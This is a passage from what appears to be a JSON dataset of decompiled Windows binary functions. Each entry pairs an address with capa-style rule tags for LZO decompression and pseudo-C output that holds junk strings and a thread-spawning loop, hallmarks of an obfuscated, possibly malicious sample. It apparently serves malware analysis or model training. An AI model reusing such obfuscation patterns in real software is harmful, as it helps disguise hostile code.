        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00403e72(void)\n\n{\n    uchar **ppuVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000024;\n    uint in_stack_00000034;\n    uint32_t in_stack_00000038;\n    uchar *in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    uint uStack200;\n    uchar uStack196;\n    char *pcStack192;\n    int32_t iStack188;\n    uint uStack172;\n    uint32_t uStack168;\n    int32_t iStack164;\n    uint uStack148;\n    uint32_t uStack144;\n    int32_t iStack140;\n    uint uStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    uint *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint32_t uStack68;\n    uint *puStack52;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c070;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000038 < 0x10) {\ncode_r0x00420194:\n        ppuStack32 = ppuVar1;\n        in_stack_00000034 = 0;\n        in_stack_00000038 = 0xf;\n        in_stack_00000024 = in_stack_00000024 & 0xffffff00;\n        if (in_stack_00000050 < 0x10) {\ncode_r0x004201da:\n            *in_FS_OFFSET = piStack28;\n            return piStack28;\n        }\n        puStack72 = in_stack_0000003c;\n        if ((in_stack_00000050 + 1 < 0x1000) ||\n           (puStack72 = *(in_stack_0000003c + -4),  in_stack_0000003c + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x004201da;\n        }\n    }\n    else {\n        uStack68 = in_stack_00000024;\n        if ((in_stack_00000038 + 1 < 0x1000) ||\n           (uStack68 = *(in_stack_00000024 - 4),  unaff_EDI = uStack68,  (in_stack_00000024 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x00420194;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack88 = &uStack200;\n    uStack76 = 0xffffffff;\n    uStack80 = 0x44c080;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    uStack172 = 0;\n    uStack168 = 0xf;\n    iStack188 = 0;\n    uStack196 = iStack140;\n    pcStack192 = \"tdblvduwuiexfflqmvjbhtxtddrwhmsycaawmcuixjwhujryaoveprpteijljjcgzztoxv\";\n    uStack200 = 0x46;\n    fcn.00402f72();\n    uStack124 = 0;\n    uStack120 = 0xf;\n    iStack140 = 0;\n    uStack76 = 4;\n    fcn.00402f72(0x3c, iStack116, \"orrpxlbcqmvmfltnjfaoiuvgruhkdmculwwdusbvvxxxxgaebexjiourcgnx\");\n    uStack100 = 0;\n    uStack96 = 0xf;\n    iStack116 = 0;\n    uStack76 = 5;\n    fcn.00402f72(0x46, iStack164, \"tdblvduwuiexfflqmvjbhtxtddrwhmsycaawmcuixjwhujryaoveprpteijljjcgzztoxv\");\n    uStack148 = 0;\n    uStack144 = 0xf;\n    iStack164 = 0;\n    uStack76 = 6;\n    fcn.00402f72(0x46, uStack92, \"tdblvduwuiexfflqmvjbhtxtddrwhmsycaawmcuixjwhujryaoveprpteijljjcgzztoxv\");\n    if (uStack144 < 0x10) {\ncode_r0x00420397:\n        if (0xf < uStack96) {\n            iVar3 = iStack116;\n            if ((0xfff < uStack96 + 1) && (iVar3 = *(iStack116 + -4),  0x1f < (iStack116 + -4) - iVar3))\n            goto code_r0x0042048a;\n            fcn.00401a32(iVar3);\n        }\n        puStack52[5] = 0xf;\n        puStack52[4] = 0xc;\n        *puStack52 = 0x797a7a72;\n        puStack52[1] = 0x757a6e64;\n        puStack52[2] = 0x7373636a;\n        *(puStack52 + 3) = 0;\n        if (0xf < uStack120) {\n            iVar3 = iStack140;\n            if ((0xfff < uStack120 + 1) && (iVar3 = *(iStack140 + -4),  0x1f < (iStack140 + -4) - iVar3))\n            goto code_r0x00420496;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack168) {\n            iVar3 = iStack188;\n            if ((0xfff < uStack168 + 1) && (iVar3 = *(iStack188 + -4),  0x1f < (iStack188 + -4) - iVar3))\n            goto code_r0x004204a2;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack84;\n        return puStack52;\n    }\n    iVar3 = iStack164;\n    if ((uStack144 + 1 < 0x1000) || (iVar3 = *(iStack164 + -4),  (iStack164 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x00420397;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x0042048a:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x00420496:\n    uStack76 = 2;\n    fcn.004047f5();\ncode_r0x004204a2:\n    uStack76 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar2 = fcn.00403a76();\n    return puVar2;\n}\n",
        "token_count": 1856
    },
    "0040168b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040168b(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint auStack48 [2];\n    char *pcStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack48;\n    uStack24 = 0x414a20;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    uStack20 = 1;\n    pcStack40 = \"nalbxgafjxczsppfsj\";\n    auStack48[0] = 0x12;\n    fcn.00402f72();\n    if (0xf < in_stack_00000030) {\n        arg_8h = in_stack_0000001c;\n        if ((0xfff < in_stack_00000030 + 1) &&\n           (arg_8h = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            puVar1 = fcn.00403a76();\n            return puVar1;\n        }\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 408
    },
    "00406870": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t fcn.00406870(uint32_t param_1)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uint32_t in_stack_00000020;\n    uint in_stack_00000030;\n    uint32_t in_stack_00000034;\n    uint32_t in_stack_00000038;\n    uint in_stack_00000048;\n    uint32_t in_stack_0000004c;\n    uint *in_stack_00000050;\n    uint32_t in_stack_00000064;\n    int32_t aiStack140 [4];\n    uint uStack124;\n    uint32_t uStack120;\n    uchar uStack116;\n    int32_t *piStack112;\n    int32_t *piStack108;\n    uint uStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint32_t uStack92;\n    int32_t iStack76;\n    uint32_t uStack56;\n    int32_t iStack52;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack96 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c910;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x0043a897:\n        ppuStack32 = ppuVar1;\n        in_stack_00000014 = 0;\n        in_stack_00000018 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (0xf < in_stack_00000034) {\n            uStack92 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (uStack92 = *(in_stack_00000020 - 4),  unaff_EDI = uStack92,  0x1f < (in_stack_00000020 - 4) - uStack92))\n            goto code_r0x0043a994;\n            fcn.00401a32(uStack92);\n        }\n        in_stack_00000030 = 0;\n        in_stack_00000034 = 0xf;\n        in_stack_00000020 = in_stack_00000020 & 0xffffff00;\n        if (0xf < in_stack_0000004c) {\n            uStack92 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (uStack92 = *(in_stack_00000038 - 4),  unaff_EDI = uStack92,  0x1f < (in_stack_00000038 - 4) - uStack92))\n            goto code_r0x0043a9a0;\n            fcn.00401a32(uStack92);\n        }\n        in_stack_00000048 = 0;\n        in_stack_0000004c = 0xf;\n        in_stack_00000038 = in_stack_00000038 & 0xffffff00;\n        if (in_stack_00000064 < 0x10) {\ncode_r0x0043a970:\n            *in_FS_OFFSET = piStack28;\n            return 0x544e;\n        }\n        puStack96 = in_stack_00000050;\n        if ((in_stack_00000064 + 1 < 0x1000) ||\n           (puStack96 = in_stack_00000050[-1],  uStack92 = unaff_EDI,  in_stack_00000050 + (-4 - puStack96) < 0x20)) {\n            fcn.00401a32(puStack96);\n            goto code_r0x0043a970;\n        }\n    }\n    else {\n        uStack92 = param_1;\n        if ((in_stack_00000018 + 1 < 0x1000) ||\n           (uStack92 = *(param_1 - 4),  unaff_EDI = uStack92,  (param_1 - 4) - uStack92 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack92);\n            ppuVar1 = ppuStack32;\n            goto code_r0x0043a897;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x0043a994:\n        uStack20 = 1;\n        fcn.004047f5();\ncode_r0x0043a9a0:\n        uStack20 = 2;\n        fcn.004047f5();\n    }\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    piStack112 = aiStack140;\n    uStack104 = 0x44c920;\n    piStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack108;\n    uStack124 = 0;\n    uStack120 = 0xf;\n    aiStack140[0] = 0;\n    uStack100 = 3;\n    fcn.00402f72(0x2c, uStack116, \"qtqgabzajshnevgtnhksxdlbgyusehozftjdnpjvxzrb\");\n    if (uStack120 < 0x10) {\ncode_r0x0043aaa9:\n        if (0xf < uStack56) {\n            iVar2 = iStack76;\n            if ((0xfff < uStack56 + 1) && (iVar2 = *(iStack76 + -4),  0x1f < (iStack76 + -4) - iVar2))\n            goto code_r0x0043ab42;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < ppuStack32) {\n            iVar2 = iStack52;\n            if ((0xfff < ppuStack32 + 1) && (iVar2 = *(iStack52 + -4),  0x1f < (iStack52 + -4) - iVar2))\n            goto code_r0x0043ab4e;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack108;\n        return piStack108;\n    }\n    iVar2 = aiStack140[0];\n    if ((uStack120 + 1 < 0x1000) || (iVar2 = *(aiStack140[0] + -4),  (aiStack140[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043aaa9;\n    }\n    uStack100 = 0;\n    fcn.004047f5();\ncode_r0x0043ab42:\n    uStack100 = 1;\n    fcn.004047f5();\ncode_r0x0043ab4e:\n    uStack100 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    iVar2 = fcn.00403a76();\n    return iVar2;\n}\n",
        "token_count": 1719
    },
    "0040179e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.0040179e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44cca0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(100);\n    if (uStack40 < 0x10) {\ncode_r0x00445819:\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x004458b8;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x004458c4;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542934;\n    }\n    iVar1 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00445819;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004458b8:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004458c4:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 675
    },
    "004017c6": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.004017c6(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c7d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"gmrhnxxviyclhqujphwxhlbczbtsjebfhiewidniobwxptssaxltmplkwkqtqmcnyigjmhjfaurfyissudyfulsnmjuheo\";\n    auStack120[0] = 0x5e;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x5e, iStack84, \n                 \"gmrhnxxviyclhqujphwxhlbczbtsjebfhiewidniobwxptssaxltmplkwkqtqmcnyigjmhjfaurfyissudyfulsnmjuheo\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x5e, uStack36, \n                 \"gmrhnxxviyclhqujphwxhlbczbtsjebfhiewidniobwxptssaxltmplkwkqtqmcnyigjmhjfaurfyissudyfulsnmjuheo\");\n    if (uStack64 < 0x10) {\ncode_r0x004372f3:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004373a6;\n            fcn.00401a32(iVar2);\n        }\n        param_1[5] = 0xf;\n        param_1[4] = 8;\n        param_1[1] = 0x6b686264;\n        *param_1 = 0x63786472;\n        *(param_1 + 2) = 0;\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004373b2;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004372f3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004373a6:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004373b2:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1011
    },
    "004017e4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004017e4(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    uint32_t in_stack_ffffff34;\n    uint32_t in_stack_ffffff40;\n    uint32_t in_stack_ffffff4c;\n    uchar uStack160;\n    ushort uStack159;\n    uint uStack157;\n    uchar uStack153;\n    uint uStack144;\n    uint uStack140;\n    int32_t iStack136;\n    uint uStack120;\n    uint32_t uStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint8_t uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff60;\n    uStack24 = 0x414870;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack120 = 0;\n    uStack116 = 0xf;\n    iStack136 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x20);\n    uStack140 = 0xf;\n    uStack144 = 7;\n    uStack160 = 0x65;\n    uStack159 = 0x6c74;\n    uStack157 = 0x73757069;\n    uStack153 = 0;\n    uVar1 = 0;\n    while( true ) {\n        uStack20 = 7;\n        if (0x5fbe < uVar1) break;\n        uStack40 = uVar1;\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(5);\n        in_stack_ffffff4c = 0;\n        in_stack_ffffff40 = 0x4031c5;\n        in_stack_ffffff34 = 0x40d8fe;\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x4031c5, 0, 0);\n        uVar1 = uStack40 + 1;\n    }\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    fcn.00402f72(0x45, in_stack_ffffff4c & 0xffffff00 | uStack64 & 0xff, \n                 \"ldtqqfyhmrwabkxcubbqcigrembqjfuangcpceydmbbxzqdbxhoplfsewhhrpgicrwvof\");\n    uStack48 = 0;\n    uStack44 = 0xf;\n    uStack64 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x45, in_stack_ffffff40 & 0xffffff00 | iStack88, \n                 \"ldtqqfyhmrwabkxcubbqcigrembqjfuangcpceydmbbxzqdbxhoplfsewhhrpgicrwvof\");\n    uStack72 = 0;\n    uStack68 = 0xf;\n    iStack88 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x45, in_stack_ffffff34 & 0xffffff00 | uStack36, \n                 \"ldtqqfyhmrwabkxcubbqcigrembqjfuangcpceydmbbxzqdbxhoplfsewhhrpgicrwvof\");\n    if (uStack68 < 0x10) {\ncode_r0x0040d9fd:\n        if (0xf < uStack44) {\n            iVar2 = uStack64;\n            if ((0xfff < uStack44 + 1) && (iVar2 = *(uStack64 + -4),  0x1f < (uStack64 + -4) - iVar2))\n            goto code_r0x0040db48;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack92) {\n            iVar2 = iStack112;\n            if ((0xfff < uStack92 + 1) && (iVar2 = *(iStack112 + -4),  0x1f < (iStack112 + -4) - iVar2))\n            goto code_r0x0040db54;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack116) {\n            iVar2 = iStack136;\n            if ((0xfff < uStack116 + 1) && (iVar2 = *(iStack136 + -4),  0x1f < (iStack136 + -4) - iVar2))\n            goto code_r0x0040db60;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0040db6c;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x0040db78;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = iStack28;\n        return;\n    }\n    iVar2 = iStack88;\n    if ((uStack68 + 1 < 0x1000) || (iVar2 = *(iStack88 + -4),  (iStack88 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0040d9fd;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040db48:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040db54:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040db60:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0040db6c:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0040db78:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1655
    },
    "0040181b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.0040181b(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c7e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x1b);\n    if (0xf < uStack40) {\n        iVar1 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0043752a;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < in_stack_0000001c) {\n        iVar1 = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (iVar1 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar1)) {\ncode_r0x0043752a:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            return;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 475
    },
    "00405056": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00405056(uint *param_1, uint32_t param_2)\n\n{\n    uchar **ppuVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000018;\n    uint32_t in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint uStack220;\n    uchar uStack216;\n    char *pcStack212;\n    int32_t iStack208;\n    uint uStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    int32_t iStack160;\n    uint uStack144;\n    uint32_t uStack140;\n    uchar uStack136;\n    uint *puStack132;\n    int32_t *piStack128;\n    uint uStack124;\n    uint uStack120;\n    int32_t iStack116;\n    uint32_t uStack112;\n    uchar **ppuStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint32_t uStack68;\n    uint32_t uStack52;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cd20;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    param_1[5] = 0xf;\n    param_1[4] = 0xe;\n    *param_1 = 0x736f6c6d;\n    param_1[1] = 0x766c7a6c;\n    param_1[2] = 0x77757969;\n    *(param_1 + 3) = 0x636b;\n    *(param_1 + 0xe) = 0;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_0000001c < 0x10) {\ncode_r0x00446be3:\n        ppuStack32 = ppuVar1;\n        in_stack_00000018 = 0;\n        in_stack_0000001c = 0xf;\n        param_2 = param_2 & 0xffffff00;\n        if (in_stack_00000034 < 0x10) {\ncode_r0x00446c29:\n            *in_FS_OFFSET = piStack28;\n            return param_1;\n        }\n        uStack112 = in_stack_00000020;\n        if ((in_stack_00000034 + 1 < 0x1000) ||\n           (uStack112 = *(in_stack_00000020 - 4),  (in_stack_00000020 - 4) - uStack112 < 0x20)) {\n            fcn.00401a32(uStack112);\n            goto code_r0x00446c29;\n        }\n    }\n    else {\n        uStack112 = param_2;\n        if ((in_stack_0000001c + 1 < 0x1000) || (uStack112 = *(param_2 - 4),  (param_2 - 4) - uStack112 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack112);\n            ppuVar1 = ppuStack32;\n            goto code_r0x00446be3;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    ppuStack88 = &ppuStack88;\n    uStack76 = 0xffffffff;\n    uStack80 = 0x44cd30;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    if (param_1 < 0x10) {\ncode_r0x00446ce4:\n        *in_FS_OFFSET = piStack84;\n        return 0x1;\n    }\n    iStack116 = unaff_ESI;\n    uStack68 = uStack112;\n    if ((param_1 + 1U < 0x1000) || (iStack116 = *(unaff_ESI + -4),  (unaff_ESI + -4) - iStack116 < 0x20)) {\n        ppuStack88 = &ppuStack88;\n        fcn.00401a32(iStack116);\n        goto code_r0x00446ce4;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack132 = &uStack220;\n    uStack124 = 0x44cd40;\n    piStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack128;\n    uStack192 = 0;\n    uStack188 = 0xf;\n    iStack208 = 0;\n    uStack120 = 4;\n    uStack216 = iStack160;\n    pcStack212 = \"vhnyedoyodzrspvffskkynklzxiswkikbpbwivbustdqinybmwxgoxxpzzwfhbleipebuk\";\n    uStack220 = 0x46;\n    fcn.00402f72();\n    uStack144 = 0;\n    uStack140 = 0xf;\n    iStack160 = 0;\n    uStack120 = 5;\n    fcn.00402f72(0x46, iStack184, \"vhnyedoyodzrspvffskkynklzxiswkikbpbwivbustdqinybmwxgoxxpzzwfhbleipebuk\");\n    uStack168 = 0;\n    uStack164 = 0xf;\n    iStack184 = 0;\n    uStack120 = 6;\n    fcn.00402f72(0x46, uStack136, \"vhnyedoyodzrspvffskkynklzxiswkikbpbwivbustdqinybmwxgoxxpzzwfhbleipebuk\");\n    if (uStack164 < 0x10) {\ncode_r0x00446e4a:\n        if (0xf < uStack140) {\n            iVar3 = iStack160;\n            if ((0xfff < uStack140 + 1) && (iVar3 = *(iStack160 + -4),  0x1f < (iStack160 + -4) - iVar3))\n            goto code_r0x00446f16;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack188) {\n            iVar3 = iStack208;\n            if ((0xfff < uStack188 + 1) && (iVar3 = *(iStack208 + -4),  0x1f < (iStack208 + -4) - iVar3))\n            goto code_r0x00446f22;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack52) {\n            puVar2 = puStack72;\n            if ((0xfff < uStack52 + 